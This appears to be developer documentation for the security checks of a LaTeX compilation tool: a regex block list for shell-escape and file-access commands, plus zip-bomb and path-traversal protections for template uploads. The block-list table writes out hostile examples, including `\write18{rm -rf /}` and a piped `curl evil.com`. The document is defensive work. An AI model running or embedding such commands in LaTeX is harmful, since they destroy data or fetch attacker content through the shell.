# LaTeX Security

## Overview

Before sending LaTeX to the compilation service, the modified main content is scanned for dangerous commands that could exploit shell access or file system operations.

## Blocked Patterns

| Pattern (Regex) | Example | Risk |
|-----------------|---------|------|
| `\\write\s*18` | `\write18{rm -rf /}` | Shell command execution |
| `\\immediate\s*\\write` | `\immediate\write18{cmd}` | Immediate shell execution |
| `\\input\s*\|` | `\input\|"curl evil.com"` | Pipe input to shell |
| `\\openout` | `\openout\file` | Arbitrary file writing |
| `\\openin` | `\openin\file` | Arbitrary file reading |
| `\\catcode` | `\catcode` manipulation | Can re-enable shell escape |

## Behavior

- Check runs BEFORE any API call is made
- If any pattern matches: returns immediately with error
- Error: `"Blocked dangerous LaTeX command: {matched command}"`
- No compilation attempt is made

## Scope

- **Only checks**: `modifiedMainContent` (the AI-generated output)
- **Does NOT check**: auxiliary files (`.cls`, `.sty`, images) - these come from the user's original template and are trusted

## Implementation

```typescript
const DANGEROUS_LATEX_PATTERNS = [
  /\\write\s*18/,
  /\\immediate\s*\\write/,
  /\\input\s*\|/,
  /\\openout/,
  /\\openin/,
  /\\catcode/,
];

function containsDangerousCommands(tex: string): string | null {
  for (const pattern of DANGEROUS_LATEX_PATTERNS) {
    const match = tex.match(pattern);
    if (match) return match[0];
  }
  return null;
}
```

## ZIP Template Upload Protections

The `TemplateUploader` component (`entrypoints/sidepanel/components/TemplateUploader.tsx`) enforces several security checks when processing uploaded `.zip` template files.

### ZIP Bomb Protection

Three limits prevent resource exhaustion attacks:

| Limit | Value | Constant |
|-------|-------|----------|
| Maximum compressed ZIP size | 10 MB | `MAX_ZIP_SIZE = 10 * 1024 * 1024` |
| Maximum total extracted size | 50 MB | `MAX_EXTRACTED_SIZE = 50 * 1024 * 1024` |
| Maximum number of files | 100 | `MAX_FILE_COUNT = 100` |

- **Compressed size** is checked before decompression (`file.size > MAX_ZIP_SIZE`)
- **Extracted size** is tracked incrementally as each file is processed (`totalExtractedSize += data.length`). If the running total exceeds 50 MB, processing halts with: `"Extracted content too large (>50 MB). Possible zip bomb."`
- **File count** is incremented per non-skipped entry. If it exceeds 100, processing halts with: `"ZIP contains too many files (>100)."`

### Path Traversal Validation

Each file path inside the ZIP is checked for traversal attacks:

```typescript
if (path.includes("..") || path.startsWith("/")) {
  setError(`Rejected unsafe path in ZIP: ${path}`);
  return;
}
```

- Rejects paths containing `..` (parent directory traversal)
- Rejects absolute paths starting with `/`
- Also skips macOS metadata directories (`__MACOSX/`), hidden files (starting with `.`), and directory entries (ending with `/`)

### Binary File Handling

Binary files (images, PDFs) are detected by extension and stored with base64 encoding:

```typescript
const BINARY_EXTS = [".jpg", ".jpeg", ".png", ".gif", ".pdf", ".eps", ".bmp", ".tiff", ".webp"];
```

- If a file's path ends with one of these extensions, its raw bytes are base64-encoded using chunked `String.fromCharCode` (8192 bytes per chunk) followed by `btoa()`
- The resulting `AuxFile` entry includes `encoding: "base64"` to distinguish it from text files
- All other non-`.tex` files are decoded as UTF-8 text via `strFromU8(data)`

## Webapp Adaptation Notes

- This client-side check is a defense-in-depth measure
- The compilation service itself should also restrict shell access
- In a webapp, server-side validation adds an additional security layer
- ZIP bomb protections should be replicated server-side if template uploads are handled by a backend
- Path traversal validation is especially critical on server-side file extraction
